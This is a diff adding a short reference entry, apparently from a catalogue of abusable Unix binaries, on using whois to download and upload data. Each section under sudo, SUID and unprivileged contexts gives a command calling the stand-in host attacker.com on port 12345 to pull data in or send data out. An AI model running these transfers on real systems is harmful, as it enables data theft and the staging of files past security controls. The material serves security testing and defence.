@@ -1,0 +1,32 @@
+whois
+=====
+
+Download
+--------
+
+[Sudo]
+    whois -h attacker.com -p 12345 x
+    Received data has instances of the `\r` byte stripped.
+
+[SUID]
+    whois -h attacker.com -p 12345 x
+    Received data has instances of the `\r` byte stripped.
+
+[Unprivileged]
+    whois -h attacker.com -p 12345 x
+    Received data has instances of the `\r` byte stripped.
+
+Upload
+------
+
+[Sudo]
+    whois -h attacker.com -p 12345 DATA
+    Data is converted to lower case, and has a trailing `\r\n`.
+
+[SUID]
+    whois -h attacker.com -p 12345 DATA
+    Data is converted to lower case, and has a trailing `\r\n`.
+
+[Unprivileged]
+    whois -h attacker.com -p 12345 DATA
+    Data is converted to lower case, and has a trailing `\r\n`.
